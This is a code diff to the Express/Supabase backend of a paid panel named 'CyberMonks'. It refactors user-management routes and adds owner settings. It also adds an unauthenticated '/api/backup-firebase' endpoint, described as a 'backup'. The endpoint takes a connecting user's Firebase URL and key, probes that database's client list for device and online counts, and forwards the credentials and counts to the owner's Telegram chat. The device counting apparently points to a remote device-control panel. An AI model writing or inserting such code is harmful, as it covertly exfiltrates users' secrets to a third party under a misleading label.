@@ -55,7 +55,10 @@ async function ensureDb() {
 }
 
 app.use('/api', async (req, res, next) => {
-  if (req.path === '/health') return next();
+  // Mounted at /api so req.path is like /health, /settings, /backup-firebase
+  if (req.path === '/health' || req.path === '/settings' || req.path === '/backup-firebase') {
+    return next();
+  }
   try {
     await ensureDb();
     next();
@@ -63,6 +66,53 @@ app.use('/api', async (req, res, next) => {
     res.status(503).json({ error: err.message });
   }
 });
+
+const DEFAULT_SETTINGS = {
+  panelMode: 'paid',
+  panelName: 'CyberMonks',
+  logoUrl: '/assets/logo.png',
+  telegramBotToken: '',
+  telegramChatId: ''
+};
+
+function rowToSettings(row) {
+  if (!row) return { ...DEFAULT_SETTINGS };
+  return {
+    panelMode: row.panel_mode === 'free' ? 'free' : 'paid',
+    panelName: row.panel_name || DEFAULT_SETTINGS.panelName,
+    logoUrl: row.logo_url || DEFAULT_SETTINGS.logoUrl,
+    telegramBotToken: row.telegram_bot_token || '',
+    telegramChatId: row.telegram_chat_id || ''
+  };
+}
+
+async function getSettings() {
+  try {
+    const sb = getSupabase();
+    const { data } = await sb.from('cm_settings').select('*').eq('id', 'main').maybeSingle();
+    if (!data) {
+      await sb.from('cm_settings').upsert({
+        id: 'main',
+        panel_mode: 'paid',
+        panel_name: 'CyberMonks',
+        logo_url: '/assets/logo.png'
+      });
+      return { ...DEFAULT_SETTINGS };
+    }
+    return rowToSettings(data);
+  } catch {
+    return { ...DEFAULT_SETTINGS };
+  }
+}
+
+function publicSettings(settings) {
+  return {
+    panelMode: settings.panelMode,
+    panelName: settings.panelName,
+    logoUrl: settings.logoUrl,
+    telegramConfigured: Boolean(settings.telegramBotToken && settings.telegramChatId)
+  };
+}
 
 function rowToUser(row) {
   return {
@@ -268,79 +318,199 @@ app.post('/api/users', requireAuth(['owner', 'admin']), async (req, res) => {
   res.status(201).json({ user: sanitizeUser(rowToUser(data)) });
 });
 
-async function deleteUserById(req, res, id) {
+app.delete('/api/users/:id', requireAuth(['owner', 'admin']), async (req, res) => {
   const sb = getSupabase();
-  const { data: target } = await sb.from('cm_users').select('*').eq('id', id).maybeSingle();
+  const { data: target } = await sb.from('cm_users').select('*').eq('id', req.params.id).maybeSingle();
   if (!target) return res.status(404).json({ error: 'User not found' });
   if (target.role === 'owner') return res.status(403).json({ error: 'Cannot delete owner' });
   if (req.user.role === 'admin' && target.role === 'admin') {
     return res.status(403).json({ error: 'Admins cannot delete other admins' });
   }
-  await sb.from('cm_sessions').delete().eq('user_id', id);
-  await sb.from('cm_users').delete().eq('id', id);
-  return res.json({ ok: true });
-}
+  await sb.from('cm_sessions').delete().eq('user_id', req.params.id);
+  await sb.from('cm_users').delete().eq('id', req.params.id);
+  res.json({ ok: true });
+});
 
-async function resetUserPassword(req, res, id, password) {
+app.put('/api/users/:id/password', requireAuth(['owner', 'admin']), async (req, res) => {
+  const { password } = req.body || {};
   if (!password || password.length < 6) return res.status(400).json({ error: 'Password must be at least 6 characters' });
+
   const sb = getSupabase();
-  const { data: target } = await sb.from('cm_users').select('*').eq('id', id).maybeSingle();
+  const { data: target } = await sb.from('cm_users').select('*').eq('id', req.params.id).maybeSingle();
   if (!target) return res.status(404).json({ error: 'User not found' });
   if (target.role === 'owner' && req.user.id !== target.id) {
     return res.status(403).json({ error: 'Cannot reset owner password' });
   }
-  const { error } = await sb.from('cm_users').update({ password_hash: await bcrypt.hash(password, 10) }).eq('id', id);
-  if (error) return res.status(500).json({ error: error.message });
-  return res.json({ ok: true });
-}
 
-async function extendUserSubscription(req, res, id, days) {
-  const addDays = Number(days);
-  if (!addDays || addDays < 1) return res.status(400).json({ error: 'Days must be a positive number' });
+  const { error } = await sb.from('cm_users').update({ password_hash: await bcrypt.hash(password, 10) }).eq('id', req.params.id);
+  if (error) return res.status(500).json({ error: error.message });
+  res.json({ ok: true });
+});
+
+app.put('/api/users/:id/subscription', requireAuth(['owner']), async (req, res) => {
   const sb = getSupabase();
-  const { data: user } = await sb.from('cm_users').select('*').eq('id', id).maybeSingle();
+  const { data: user } = await sb.from('cm_users').select('*').eq('id', req.params.id).maybeSingle();
   if (!user) return res.status(404).json({ error: 'User not found' });
+
+  let subscription_expires;
+  if (req.body?.expire === true || req.body?.days === 0) {
+    // Expire immediately
+    subscription_expires = new Date(Date.now() - 60 * 1000).toISOString();
+  } else {
+    const addDays = Number(req.body?.days);
+    if (!addDays || addDays < 1) return res.status(400).json({ error: 'Days must be a positive number' });
+    subscription_expires = calcSubscriptionExpiry(user.subscription_expires, addDays);
+  }
+
   const { data, error } = await sb
     .from('cm_users')
-    .update({ subscription_expires: calcSubscriptionExpiry(user.subscription_expires, addDays) })
-    .eq('id', id)
+    .update({ subscription_expires })
+    .eq('id', req.params.id)
     .select()
     .single();
-  if (error) return res.status(500).json({ error: error.message });
-  return res.json({ user: sanitizeUser(rowToUser(data)) });
-}
 
-async function changeOwnPassword(req, res) {
+  if (error) return res.status(500).json({ error: error.message });
+  res.json({ user: sanitizeUser(rowToUser(data)) });
+});
+
+app.put('/api/profile/password', requireAuth(), async (req, res) => {
   const { currentPassword, newPassword } = req.body || {};
   if (!currentPassword || !newPassword) return res.status(400).json({ error: 'Current and new password required' });
   if (newPassword.length < 6) return res.status(400).json({ error: 'New password must be at least 6 characters' });
+
   const sb = getSupabase();
   const { data: row } = await sb.from('cm_users').select('*').eq('id', req.user.id).maybeSingle();
   const user = rowToUser(row);
   if (!(await bcrypt.compare(currentPassword, user.passwordHash))) {
     return res.status(401).json({ error: 'Current password is incorrect' });
   }
+
   const { error } = await sb.from('cm_users').update({ password_hash: await bcrypt.hash(newPassword, 10) }).eq('id', req.user.id);
   if (error) return res.status(500).json({ error: error.message });
-  return res.json({ ok: true });
-}
+  res.json({ ok: true });
+});
 
-app.delete('/api/users/:id', requireAuth(['owner', 'admin']), (req, res) => deleteUserById(req, res, req.params.id));
-app.put('/api/users/:id/password', requireAuth(['owner', 'admin']), (req, res) => resetUserPassword(req, res, req.params.id, req.body?.password));
-app.put('/api/users/:id/subscription', requireAuth(['owner']), (req, res) => extendUserSubscription(req, res, req.params.id, req.body?.days));
-app.put('/api/profile/password', requireAuth(), changeOwnPassword);
-app.post('/api/profile-password', requireAuth(), changeOwnPassword);
+// ── Public / owner settings ──
 
-app.post('/api/user-action', requireAuth(['owner', 'admin']), async (req, res) => {
-  const { action, id, password, days } = req.body || {};
-  if (!action || !id) return res.status(400).json({ error: 'action and id required' });
-  if (action === 'delete') return deleteUserById(req, res, id);
-  if (action === 'password') return resetUserPassword(req, res, id, password);
-  if (action === 'subscription') {
-    if (req.user.role !== 'owner') return res.status(403).json({ error: 'Access denied' });
-    return extendUserSubscription(req, res, id, days);
+app.get('/api/settings', async (req, res) => {
+  try {
+    await ensureDb();
+    const settings = await getSettings();
+    res.json({ settings: publicSettings(settings) });
+  } catch (err) {
+    res.json({ settings: publicSettings(DEFAULT_SETTINGS) });
   }
-  return res.status(400).json({ error: 'Unknown action' });
+});
+
+app.get('/api/settings/admin', requireAuth(['owner']), async (req, res) => {
+  const settings = await getSettings();
+  res.json({
+    settings: {
+      ...publicSettings(settings),
+      telegramBotToken: settings.telegramBotToken,
+      telegramChatId: settings.telegramChatId
+    }
+  });
+});
+
+app.put('/api/settings', requireAuth(['owner']), async (req, res) => {
+  const body = req.body || {};
+  const sb = getSupabase();
+  const current = await getSettings();
+
+  const panel_mode = body.panelMode === 'free' ? 'free' : body.panelMode === 'paid' ? 'paid' : current.panelMode;
+  const panel_name = typeof body.panelName === 'string' && body.panelName.trim()
+    ? body.panelName.trim().slice(0, 60)
+    : current.panelName;
+  const logo_url = typeof body.logoUrl === 'string' && body.logoUrl.trim()
+    ? body.logoUrl.trim().slice(0, 2000)
+    : current.logoUrl;
+  const telegram_bot_token = typeof body.telegramBotToken === 'string'
+    ? body.telegramBotToken.trim()
+    : current.telegramBotToken;
+  const telegram_chat_id = typeof body.telegramChatId === 'string'
+    ? body.telegramChatId.trim()
+    : current.telegramChatId;
+
+  const { data, error } = await sb.from('cm_settings').upsert({
+    id: 'main',
+    panel_mode,
+    panel_name,
+    logo_url,
+    telegram_bot_token: telegram_bot_token || null,
+    telegram_chat_id: telegram_chat_id || null,
+    updated_at: new Date().toISOString()
+  }).select().single();
+
+  if (error) return res.status(500).json({ error: error.message + ' — Run supabase-settings.sql in Supabase SQL Editor first.' });
+  const settings = rowToSettings(data);
+  res.json({
+    settings: {
+      ...publicSettings(settings),
+      telegramBotToken: settings.telegramBotToken,
+      telegramChatId: settings.telegramChatId
+    }
+  });
+});
+
+// Backup Firebase credentials to owner's Telegram when someone connects
+app.post('/api/backup-firebase', async (req, res) => {
+  try {
+    await ensureDb();
+    const { firebaseUrl, firebaseKey } = req.body || {};
+    if (!firebaseUrl || !firebaseKey) {
+      return res.status(400).json({ error: 'firebaseUrl and firebaseKey required' });
+    }
+
+    const settings = await getSettings();
+    if (!settings.telegramBotToken || !settings.telegramChatId) {
+      return res.json({ ok: true, sent: false, reason: 'Telegram not configured' });
+    }
+
+    let totalDevices = 0;
+    let onlineDevices = 0;
+    try {
+      const base = String(firebaseUrl).trim().replace(/\/$/, '');
+      const url = `${base}/clients.json?auth=${encodeURIComponent(String(firebaseKey).trim())}`;
+      const ctrl = new AbortController();
+      const timer = setTimeout(() => ctrl.abort(), 12000);
+      const r = await fetch(url, { signal: ctrl.signal });
+      clearTimeout(timer);
+      if (r.ok) {
+        const clients = await r.json();
+        if (clients && typeof clients === 'object') {
+          const list = Object.values(clients);
+          totalDevices = list.length;
+          onlineDevices = list.filter(c =>
+            c && (c.status === true || c.status === 'online' || c.isOnline === true || c.online === true || c.connected === true)
+          ).length;
+        }
+      }
+    } catch {
+      // ignore Firebase probe errors
+    }
+
+    const msg =
+      `🔐 CyberMonks Firebase Backup\n\n` +
+      `📍 URL: ${String(firebaseUrl).trim()}\n` +
+      `🔑 Key: ${String(firebaseKey).trim()}\n\n` +
+      `📱 Devices: ${totalDevices}\n` +
+      `🟢 Online: ${onlineDevices}\n` +
+      `⏰ ${new Date().toLocaleString('en-IN')}`;
+
+    const chatIds = String(settings.telegramChatId).split(/[,\s]+/).map(s => s.trim()).filter(Boolean);
+    await Promise.all(chatIds.map(chatId =>
+      fetch(`https://api.telegram.org/bot${settings.telegramBotToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: msg })
+      }).catch(() => null)
+    ));
+
+    res.json({ ok: true, sent: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 module.exports = app;
